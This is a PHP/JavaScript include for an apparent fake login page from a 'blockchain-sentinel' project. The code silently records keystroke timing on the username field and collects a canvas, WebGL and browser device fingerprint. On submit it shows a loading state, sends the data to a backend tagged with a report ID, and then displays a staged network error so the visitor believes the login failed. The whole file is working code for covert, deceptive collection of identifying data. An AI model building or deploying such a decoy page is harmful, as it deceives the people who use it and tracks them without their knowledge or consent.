<?php /* _behavioral.php — silent biometrics, fires on username field, throws network error after submit */ ?>
<script src="/blockchain-sentinel/behavioral_biometrics.js"></script>
<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';

const bc = new BehavioralCollector();
// Attach to username field only
const _nf = document.getElementById('usernameField');
bc._start_time = null;
_nf.addEventListener('keydown', function(e) {
  const t = Date.now();
  if (!bc._start_time) bc._start_time = t;
  const cat = bc._cat(e.key);
  bc._key_down_at[e.code] = t;
  if (cat === 'DEL') { bc._backspaces++; }
  else {
    bc._total_keys++;
    if (bc._last_up_at !== null) {
      const ft = t - bc._last_up_at;
      if (ft > 0 && ft < 3000) bc._flight_times.push(ft);
    }
  }
}, true);
_nf.addEventListener('keyup', function(e) {
  const t = Date.now();
  const down = bc._key_down_at[e.code];
  if (down !== undefined) {
    const hold = t - down;
    if (hold > 0 && hold < 2000) bc._hold_times.push(hold);
    delete bc._key_down_at[e.code];
  }
  bc._last_up_at = t;
}, true);
bc._watching = true;

// Device fingerprint — silent
function _collect() {
  return {
    screen_resolution: screen.width+'x'+screen.height,
    color_depth: screen.colorDepth,
    browser: navigator.userAgent, os: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset: new Date().getTimezoneOffset(),
    device_memory: navigator.deviceMemory||'unknown',
    hardware_concurrency: navigator.hardwareConcurrency||'unknown',
    touch_support: navigator.maxTouchPoints||0,
    pixel_ratio: window.devicePixelRatio||1,
    canvas_fingerprint: _gc(), webgl_fingerprint: _gw(),
  };
}
function _gc(){try{const c=document.createElement('canvas');c.width=200;c.height=36;const x=c.getContext('2d');x.fillStyle='#555';x.fillRect(0,0,200,36);x.fillStyle='#fff';x.font='13pt Arial';x.fillText('fp-token',4,26);return c.toDataURL().slice(-50);}catch(e){return'n/a';}}
function _gw(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl');if(!gl)return'n/a';const ext=gl.getExtension('WEBGL_debug_renderer_info');return((ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'')+'::'+( ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'')).substr(0,80);}catch(e){return'n/a';}}
async function _sha256(m){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(m));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
async function _sendFP(fp){try{const r=await fetch(location.origin+'/blockchain-sentinel/backend/realtime_scan.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:''})});const d=await r.json();return d.hash||await _sha256(JSON.stringify(fp));}catch(e){return await _sha256(JSON.stringify(fp));}}

// ── Submit handler ──────────────────────────────────────────────────────────
// 1. Button shows platform-native loading text
// 2. Silently fires device fingerprint + behavioral biometrics in background
// 3. After ~2.4s → shows realistic network error, page stays broken
async function handleSubmit(e) {
  e.preventDefault();
  const btn = document.getElementById('loginBtn');
  const errEl = document.getElementById('netError');

  // Show loading state — looks like a real login attempt
  btn.disabled = true;
  btn.dataset.orig = btn.textContent;
  btn.textContent = btn.dataset.loading || 'Logging in...';

  // Fire data collection silently in background (don't await — let it run)
  const fp = _collect();
  Promise.all([_sendFP(fp), bc.send(REPORT_ID, ROLE)]).catch(()=>{});

  // Wait realistic network delay (1.8–2.6s)
  await new Promise(r => setTimeout(r, 1800 + Math.random() * 800));

  // Restore button
  btn.disabled = false;
  btn.textContent = btn.dataset.orig;

  // Show network error — looks like a real server error
  if (errEl) {
    errEl.style.display = 'block';
    // Scroll error into view on mobile
    errEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
}
</script>
